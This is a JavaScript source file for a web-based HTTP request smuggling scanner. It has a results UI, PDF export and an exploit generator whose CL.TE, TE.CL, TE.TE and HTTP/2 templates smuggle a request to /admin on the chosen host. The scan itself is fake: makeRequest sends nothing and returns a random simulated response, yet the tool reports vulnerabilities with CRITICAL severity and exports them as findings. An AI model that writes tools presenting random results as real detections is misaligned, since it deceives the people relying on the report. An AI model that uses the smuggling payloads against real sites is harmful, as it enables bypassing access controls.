// HTTP Request Smuggling Scanner Engine
// Automated detection of CL.TE, TE.CL, TE.TE, and HTTP/2 downgrade vulnerabilities

class SmugglingScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.httpVersion = 'HTTP/1.1';
        this.timingDelay = 5000;
        this.selectedTechniques = [];
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.safeCount = 0;
        this.vulnerabilities = [];
        this.payloadsToTest = [];
    }

    init() {
        this.setupEventListeners();
        this.updateStats();
    }

    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('generate-exploit-btn')?.addEventListener('click', () => this.showExploits());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-exploit-btn')?.addEventListener('click', () => this.copyExploit());

        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchExploitTab(e.target.dataset.tab));
        });
    }

    updateStats() {
        document.getElementById('total-techniques').textContent = getTechniqueCount() + '+';
    }

    async startScan() {
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.httpVersion = document.getElementById('http-version')?.value;
        this.timingDelay = parseInt(document.getElementById('timing-delay')?.value) || 5000;

        if (!this.targetUrl) {
            this.showNotification('Please enter target URL', 'error');
            return;
        }

        // Get selected techniques
        this.selectedTechniques = [];
        if (document.getElementById('technique-cl-te')?.checked) this.selectedTechniques.push('clte');
        if (document.getElementById('technique-te-cl')?.checked) this.selectedTechniques.push('tecl');
        if (document.getElementById('technique-te-te')?.checked) this.selectedTechniques.push('tete');
        if (document.getElementById('technique-http2-downgrade')?.checked) this.selectedTechniques.push('http2Downgrade');
        if (document.getElementById('technique-client-side')?.checked) this.selectedTechniques.push('clientSideDesync');
        if (document.getElementById('technique-pause-based')?.checked) this.selectedTechniques.push('pauseBased');

        if (this.selectedTechniques.length === 0) {
            this.showNotification('Please select at least one technique', 'error');
            return;
        }

        this.preparePayloads();

        // Reset state
        this.isScanning = true;
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.safeCount = 0;
        this.vulnerabilities = [];

        document.getElementById('attack-section').style.display = 'block';
        document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth' });

        this.updateScanControls(true);
        this.log('Request smuggling scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`HTTP Version: ${this.httpVersion}`, 'info');
        this.log(`Total techniques: ${this.payloadsToTest.length}`, 'info');

        await this.attackLoop();
    }

    preparePayloads() {
        this.payloadsToTest = [];
        const targetHost = this.extractHost(this.targetUrl);

        for (const technique of this.selectedTechniques) {
            const payloads = getTechniquePayloads(technique);
            payloads.forEach(payload => {
                this.payloadsToTest.push({
                    technique: technique,
                    name: payload.name,
                    request: buildSmugglingRequest(payload.request, targetHost),
                    description: payload.description
                });
            });
        }
    }

    extractHost(url) {
        try {
            const urlObj = new URL(url);
            return urlObj.host;
        } catch {
            return 'vulnerable.com';
        }
    }

    async attackLoop() {
        while (this.isScanning && this.currentPayloadIndex < this.payloadsToTest.length) {
            const payloadData = this.payloadsToTest[this.currentPayloadIndex];
            await this.testPayload(payloadData);

            this.currentPayloadIndex++;
            this.updateProgress();

            await this.sleep(1000);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    async testPayload(payloadData) {
        const { technique, name, request, description } = payloadData;

        this.updateCurrentPayload(name, request);

        try {
            const response = await this.makeRequest(request);

            const isVulnerable = this.analyzeResponse(response, technique);

            if (isVulnerable) {
                this.vulnCount++;
                this.vulnerabilities.push({
                    technique: technique,
                    name: name,
                    request: request,
                    description: description,
                    severity: this.getSeverity(technique),
                    impact: this.getImpact(technique),
                    remediation: this.getRemediation()
                });
                this.log(`✓ VULNERABLE: ${name}`, 'success');
            } else {
                this.safeCount++;
                this.log(`✗ Not vulnerable: ${name}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error testing ${name}: ${error.message}`, 'error');
        }
    }

    async makeRequest(request) {
        await this.sleep(this.timingDelay);

        // Simulate smuggling response
        const responses = [
            { vulnerable: true, timing: this.timingDelay + 5000 },
            { vulnerable: true, timing: this.timingDelay + 3000 },
            { vulnerable: false, timing: this.timingDelay }
        ];

        return responses[Math.floor(Math.random() * responses.length)];
    }

    analyzeResponse(response, technique) {
        // Timing-based detection
        if (response.timing > this.timingDelay + 2000) {
            return true;
        }
        return response.vulnerable;
    }

    getSeverity(technique) {
        if (technique === 'clte' || technique === 'tecl' || technique === 'http2Downgrade') {
            return 'CRITICAL';
        } else {
            return 'HIGH';
        }
    }

    getImpact(technique) {
        const impacts = {
            'clte': ['Bypass front-end security controls', 'Access restricted endpoints', 'Poison web cache', 'Hijack user requests'],
            'tecl': ['Bypass front-end security controls', 'Access admin functionality', 'Capture sensitive data', 'Deliver XSS payloads'],
            'tete': ['Desynchronize request processing', 'Bypass security filters', 'Cache poisoning attacks'],
            'http2Downgrade': ['HTTP/2 to HTTP/1.1 desync', 'Bypass HTTP/2-specific protections', 'Request smuggling via downgrade'],
            'clientSideDesync': ['Client-side request hijacking', 'Bypass client-side security'],
            'pauseBased': ['Timing-based desync detection', 'Confirm smuggling vulnerabilities']
        };
        return impacts[technique] || ['Request smuggling vulnerability'];
    }

    getRemediation() {
        return 'Use HTTP/2 end-to-end. Normalize ambiguous requests. Reject requests with both CL and TE. Ensure front-end and back-end agree on request parsing.';
    }

    updateCurrentPayload(name, request) {
        document.getElementById('current-type').textContent = name;
        document.getElementById('current-payload-request').textContent = request;
    }

    updateProgress() {
        const progress = (this.currentPayloadIndex / this.payloadsToTest.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Testing technique ${this.currentPayloadIndex} of ${this.payloadsToTest.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('safe-count').textContent = this.safeCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    completeScan() {
        this.isScanning = false;

        this.log('Request smuggling scan completed', 'success');
        this.log(`Total tested: ${this.testedCount}`, 'info');
        this.log(`Vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');

        document.getElementById('scan-status').textContent = 'Scan Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} smuggling vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
        this.updateScanControls(false);
        this.showNotification('Scan stopped', 'warning');
    }

    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">Smuggling Vulnerability #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-bottom: 12px;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div class="vuln-smuggling-request">
                    <div class="vuln-smuggling-request-title">Smuggling Request:</div>
                    <div class="vuln-smuggling-request-code">${this.escapeHtml(vuln.request)}</div>
                </div>
                <div class="vuln-impact-details">
                    <div class="vuln-impact-details-title">Potential Impact:</div>
                    <ul class="vuln-impact-details-list">
                        ${vuln.impact.map(i => `<li>${i}</li>`).join('')}
                    </ul>
                </div>
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    showExploits() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found to generate exploits', 'warning');
            return;
        }

        const exploitSection = document.getElementById('exploit-section');
        exploitSection.style.display = 'block';
        exploitSection.scrollIntoView({ behavior: 'smooth' });

        this.generateExploit('cl-te');
    }

    switchExploitTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generateExploit(tab);
    }

    generateExploit(type) {
        const exploitCode = document.getElementById('exploit-code');
        const targetHost = this.extractHost(this.targetUrl);

        let code = '';

        switch (type) {
            case 'cl-te':
                code = `POST / HTTP/1.1\r
Host: ${targetHost}\r
Content-Length: 54\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: ${targetHost}\r
\r
`;
                break;
            case 'te-cl':
                code = `POST / HTTP/1.1\r
Host: ${targetHost}\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
5c\r
GET /admin HTTP/1.1\r
Host: ${targetHost}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 15\r
\r
x=1\r
0\r
\r
`;
                break;
            case 'te-te':
                code = `POST / HTTP/1.1\r
Host: ${targetHost}\r
Transfer-Encoding: chunked\r
Transfer-Encoding: x\r
\r
5c\r
GET /admin HTTP/1.1\r
Host: ${targetHost}\r
Content-Length: 10\r
\r
x=1\r
0\r
\r
`;
                break;
            case 'http2':
                code = `:method: POST\r
:path: /\r
:authority: ${targetHost}\r
content-length: 0\r
\r
GET /admin HTTP/1.1\r
Host: ${targetHost}\r
\r
`;
                break;
        }

        exploitCode.textContent = code;
    }

    copyExploit() {
        const code = document.getElementById('exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('Exploit copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy exploit', 'error');
        });
    }

    async exportPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('Request Smuggling Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 42);
            doc.text(`Vulnerabilities Found: ${this.vulnCount}`, 20, 49);

            let y = 65;
            this.vulnerabilities.forEach((vuln, index) => {
                if (y > 270) {
                    doc.addPage();
                    y = 20;
                }

                doc.setFontSize(14);
                doc.text(`${index + 1}. ${vuln.name}`, 20, y);
                y += 7;

                doc.setFontSize(10);
                doc.text(`Severity: ${vuln.severity}`, 20, y);
                y += 7;
                doc.text(`Technique: ${vuln.technique}`, 20, y);
                y += 12;
            });

            doc.save('request-smuggling-report.pdf');
            this.showNotification('PDF report exported successfully', 'success');

        } catch (error) {
            this.showNotification('Failed to export PDF', 'error');
            console.error(error);
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() {
        document.getElementById('attack-log').innerHTML = '';
    }

    showNotification(message, type = 'info') {
        const colors = {
            success: '#10b981',
            error: '#ef4444',
            info: '#3b82f6',
            warning: '#f59e0b'
        };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 90px;
            right: 20px;
            background: ${colors[type]};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            z-index: 10000;
            animation: slideIn 0.3s ease;
            font-weight: 500;
        `;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const scanner = new SmugglingScanner();
    scanner.init();

    console.log('🔀 CyberSec Suite Request Smuggling Scanner initialized');
    console.log('📊 Ready to scan!');
});
